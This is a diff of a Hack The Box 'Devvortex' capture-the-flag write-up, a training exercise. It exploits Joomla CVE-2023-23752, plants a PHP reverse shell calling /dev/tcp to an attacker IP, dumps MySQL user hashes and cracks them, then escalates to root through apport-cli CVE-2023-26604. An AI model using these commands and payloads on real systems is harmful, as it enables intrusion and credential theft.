@@ -1,14 +1,7 @@
----
-title: Hack The Box - Devvortex
-date: 2024-09-06 13:33:37 +0200
-categories:
-  - HackTheBox
-tags:
-  - HTB
-comments: true
----
 
 HTB Devvortex Machine - https://www.hackthebox.com/machines/devvortex
+
+### 06/03/2024
 
 ### Scanning & Enumeration
 Scan the machine with Nmap first
@@ -26,7 +19,7 @@ nmap -sC -sV -v 10.10.11.242 -oN nmap.log
 `|_http-server-header: nginx/1.18.0 (Ubuntu)`  
 `Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
 
-And port 80 is redirecting us to `http://devvortex.htb/`.
+And port 80 is redirecting us to <http://devvortex.htb/>.
 
 So add it to our hosts file: `/etc/hosts`
 ```
@@ -36,4 +29,180 @@ echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
 
 And navigate to the **devvortex.htb**, to see what we have got
 
-![](/assets/img/posts/Pasted image 20250817003954.png)
+![[Pasted image 20250817003954.png]]
+
+The first step was directory enumeration using two wordlists
+```
+wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -t 50 --hc 302
+wfuzz -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://dev.devvortex.htb/FUZZ -t 200 --hc 404,403
+```
+
+output:
+`/dev`
+`/administrator`
+
+Or we can go to: `/robots.txt` , this is a Joomla CMS.
+
+![[Pasted image 20250817004059.png]]
+
+Navigating to `/dev` subdomain, to see what we got here
+
+ ![[Pasted image 20250817004108.png]]
+
+Navigating to`/administrator` , to see what is inside of it
+
+![[Pasted image 20250817004133.png|918]]
+
+### Exploitation & Gaining Access
+And we confirmed that it is a Joomla version, so lets looking for vulnerabilities for it in google, we found CVE-2023-2375 which affecting Joomla! < 4.2.8:
+	https://github.com/Acceis/exploit-CVE-2023-23752
+
+Using it is simple as like that
+```
+ruby exploit.rb http://dev.devvortex.htb
+```
+
+![](/assets/img/posts/018_Devvortex_-_Easy_Machine_004.png)
+
+We got a username, and a password
+	`user: lewis`
+	`password: P4ntherg0t1n5r3c0n##`
+
+Log-in with these credentials to the Joomla page
+
+![](/assets/img/posts/018_Devvortex_-_Easy_Machine_005.png)
+
+Heading to System > Templates > Administrator Templates > Atum Details and Files > login.php
+
+Lets customize a PHP reverse shell, to put it here
+
+![](/assets/img/posts/018_Devvortex_-_Easy_Machine_006.png)
+
+First, make a netcat listener
+```
+nc -nvlp 4444
+```
+
+Second, execute PHP reverse shell execution through template editing
+```
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.26/4444 0>&1'");     // use this
+system('bash -c "bash -i >& /dev/tcp/10.10.16.26/4444 0>&1"');       // or this
+```
+
+We got a shell
+
+### Privilege Escalation
+#### Upgrading our Shell
+To upgrade our shell, i will use well-known method
+```
+script /dev/null -c /bin/bash
+CTRL + Z
+stty raw -echo; fg
+# Then press Enter twice and then enter the below command:
+export TERM=xterm
+```
+
+Now, I had a properly working shell, but my current user couldn't read the user flag:
+```
+www-data@devvortex:~/dev.devvortex.htb/administrator$ id
+```
+`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
+
+#### 1- Retrieve Data from MySQL
+The credentials obtained from exploiting the Joomla information leak vulnerability were for MySQL, so connect to MySQL to explore the users table:
+```
+www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
+Enter password: P4ntherg0t1n5r3c0n##
+
+mysql> show databases;
+```
+
+![Machine generated alternative text: . devvortex . htb/administrator\$ mysql Enter password: or Welcome to the MySQL monitor . Commands end with , Your MySQL connection id is 81 Server version: 8.0.35-0ubuntuø.2ø.04.1 (Ubuntu) Copyright (c) 2000, 2023, Oracle and/or its affiliates. -u lewis Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners . or \'\\h\' for help. Type \'\\c\' to clear the current input statement. Type \'help;\' mysql\> show databases; Database information \_ schema joomla performance \_ schema I (0.00 sec) rows in set ](018_Devvortex_-_Easy_Machine_007.png){width="7.0625in" height="3.9375in"}
+
+Read MySQL DB table
+```
+mysql> use joomla;
+```
+
+![](/assets/img/posts/018_Devvortex_-_Easy_Machine_008.png)
+
+```
+mysql> show tables;
+mysql> select \* from sd4fg_users;
+```
+
+`| 649 | lewis | lewis | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u`
+`| 650 | logan paul | logan | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`
+
+2 row of the MySQL DB will display to us
+
+Using hashcat to crack that hashes we got
+```
+hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt
+```
+Results: tequieromucho
+
+SSH credentials in play! Connecting to the digital realm with finesse.
+```
+ssh logan@10.10.11.242
+tequieromucho
+
+logan@devvortex:~$ cat user.txt    # bb7c18c7da7caaf1d1e77d32c2aa57f9
+```
+
+#### 2- Searching for Misconfiguration
+To list the programs that can run via sudo without password
+```
+logan@devvortex:~$ sudo -l
+```
+
+![[Pasted image 20250817004501.png]]
+
+After searching google for vulnerabilities in apport-cli 2.26.0 and earlier with CVE-2023-26604 https://github.com/advisories/GHSA-8989-8fhv-vq42
+
+For the exploit to succeed, the system must be uniquely configured, allowing unprivileged users to execute sudo apport-cli. With less configured as the pager and adjustable terminal size
+
+A local attacker gains the privilege escalator. While rare, the possibility underscores the importance of prudent sudo configurations
+https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb
+
+```
+logan@devvortex:~$ sleep 60 &
+[2] 1537
+
+logan@devvortex:~$ kill -SIGSEGV 1537
+logan@devvortex:~$ ls /var/crash/
+_usr_bin_sleep.1000.crash
+
+[2]+ Segmentation fault (core dumped) sleep 60
+```
+
+Run the file with sudo privilege
+```
+logan@devvortex:~$ sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
+
+What would you like to do? Your options are:  
+S: Send report (30.0 KB)  
+V: View report  
+K: Keep report file for sending later or copying to somewhere else  
+I: Cancel and ignore future crashes of this program version  
+C: Cancel  
+Please choose (S/V/K/I/C): v  
+*** Collecting problem information  
+  
+The collected information can be sent to the developers to improve the  
+application. This might take a few minutes.  
+............................................................................................................................................  
+  
+== DistroRelease =================================  
+Ubuntu 20.04  
+```
+
+Then write this command, to back to our terminal again
+```
+!/bin/bash
+```
+
+Expose the root flag
+```
+root@devvortex:/home/logan# cat /root/root.txt             # 3a6e38c6b317f7eeb5ce5cb4c9833d73
+```
